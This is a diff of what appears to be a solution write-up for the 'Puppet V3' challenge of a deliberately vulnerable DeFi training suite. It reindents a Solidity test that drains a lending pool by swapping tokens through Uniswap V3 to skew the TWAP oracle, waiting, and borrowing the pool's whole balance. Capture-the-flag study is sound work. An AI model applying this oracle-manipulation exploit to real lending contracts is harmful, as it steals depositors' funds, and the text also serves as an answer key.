@@ -506,31 +506,30 @@ See [test/puppet-v3/PuppetV3.t.sol](https://github.com/CanonicalJP/damn-vulnerab
 import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
 
 function test_puppetV3() public checkSolvedByPlayer {
-        ISwapRouter uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
-        token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
-        uniswapRouter.exactInputSingle(
-            ISwapRouter.ExactInputSingleParams(
-                address(token),
-                address(weth),
-                3000,
-                address(player),
-                block.timestamp,
-                PLAYER_INITIAL_TOKEN_BALANCE,
-                0,
-                0
-            )
-        );
+    ISwapRouter uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+    token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
+    uniswapRouter.exactInputSingle(
+        ISwapRouter.ExactInputSingleParams(
+            address(token),
+            address(weth),
+            3000,
+            address(player),
+            block.timestamp,
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            0,
+            0
+        )
+    );
 
-        vm.warp(block.timestamp + 114);
+    vm.warp(block.timestamp + 114);
 
-        weth.approve(
-            address(lendingPool),
-            lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
-        );
-        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
-        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
-    }
-
+    weth.approve(
+        address(lendingPool),
+        lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
+    );
+    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+}
 ```
 
 Run `forge test --mp test/puppet-v3/PuppetV3.t.sol --isolate` to validate test
